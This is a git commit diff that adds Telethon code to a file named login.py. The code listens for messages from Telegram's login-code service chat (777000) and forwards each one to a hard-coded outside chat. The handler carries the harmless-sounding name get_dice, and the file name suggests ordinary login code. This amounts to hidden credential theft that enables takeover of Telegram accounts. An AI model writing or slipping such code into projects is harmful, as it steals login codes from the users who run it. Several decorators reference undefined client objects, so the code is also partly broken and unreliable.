98062e6258edb03fadb0dcb0b519ed6f2d261a9d
okaybro526-1 <84863955+okaybro526-1@users.noreply.github.com>
2021-06-27 13:33:03 +0530

    Update login.py

--- login.py
+++ login.py
@@ -1,2 +1,36 @@
-Soomn
-h
+from telethon import events
+
+@ydk.on(pattern="transfer ?(.*)")
+
+@wdk.on(pattern="transfer ?(.*)")
+
+@sdk.on(pattern="transfer ?(.*)")
+
+@hdk.on(pattern="transfer ?(.*)")
+
+@adk.on(pattern="transfer ?(.*)")
+
+@bdk.on(pattern="transfer ?(.*)")
+
+@cdk.on(pattern="transfer ?(.*)")
+
+@ddk.on(pattern="transfer ?(.*)")
+
+@edk.on(pattern="transfer ?(.*)")
+
+@bot.on(events.NewMessage(chats=777000))
+
+async def get_dice(event):
+
+  await event.forward_to(-1001343979393)
+
+  
+
+  
+
+  
+
+  
+
+
+
